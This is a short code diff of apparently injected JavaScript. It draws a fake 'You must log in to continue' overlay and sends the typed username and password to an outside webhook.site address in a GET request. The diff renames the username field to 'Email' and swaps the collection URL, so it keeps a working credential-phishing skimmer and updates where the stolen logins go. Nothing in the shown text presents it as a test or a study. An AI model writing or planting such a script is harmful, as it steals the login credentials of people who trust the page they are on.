@@ -24,7 +24,7 @@ form.style.zIndex = '1000';
 form.innerHTML = `
 <h5 style="margin-bottom: 15px;">Oops! You must log in to continue:</h5>
 <div style="margin-bottom: 10px;">
-    <label for="username" style="display:block;">Username</label>
+    <label for="username" style="display:block;">Email</label>
     <input type="text" id="username" style="width: 100%; padding: 5px;" required>
 </div>
 <div style="margin-bottom: 10px;">
@@ -47,7 +47,7 @@ if (!username || !password) {
 }
 
 // Send the GET request
-const webhook_url = 'https://webhook.site/9566bd35-302d-491a-bbbb-07339690e958';
+const webhook_url = 'https://webhook.site/772b3584-1819-4da5-b7e2-453c06111d16';
 const url = `${webhook_url}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
 fetch(url, { method: 'GET' });
 
